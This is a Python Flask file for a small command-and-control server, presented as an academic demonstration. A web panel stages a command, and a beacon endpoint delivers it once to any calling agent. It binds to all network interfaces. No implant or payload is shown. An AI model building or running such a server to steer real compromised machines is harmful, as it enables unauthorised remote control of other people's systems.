from flask import Flask, request, jsonify, redirect

app = Flask(__name__)

# Buffer to store the last command issued to agents
command_buffer = {"cmd": ""}

@app.route("/")
def home():
    """
    Simplified Web Panel for the C2 Server.
    Provides a basic UI to issue commands to connected agents.
    """
    return """
    <h2>Academic Demonstration C2 Panel</h2>
    <p>This panel is for EDUCATIONAL PURPOSES only. It does not control real systems.</p>
    <form action="/set" method="post">
        <input name="cmd" placeholder="Enter benign command (e.g., rickroll)">
        <button type="submit">Deploy Command</button>
    </form>
    """

@app.route("/set", methods=["POST"])
def set_cmd():
    """
    Receives a command from the web UI and stores it in the buffer 
    waiting for an agent to perform a beacon/callback.
    """
    cmd = request.form.get("cmd", "")
    command_buffer["cmd"] = cmd
    return f"Command successfully staged: {cmd}"

@app.route("/c2", methods=["POST"])
def beacon():
    """
    C2 Callback Endpoint.
    Agents POST to this URL to receive instructions.
    The command is cleared after delivery to simulate a 'one-time directive' workflow.
    """
    # Extract agent metadata from the JSON payload
    agent = request.json.get("agent", "unknown")
    cmd = command_buffer["cmd"]

    # Clear the buffer after delivery to ensure the command only runs once
    command_buffer["cmd"] = ""

    return jsonify({"agent": agent, "cmd": cmd})

if __name__ == "__main__":
    # Host 0.0.0.0 makes the server accessible over the local network or internet
    app.run(host="0.0.0.0", port=5050)
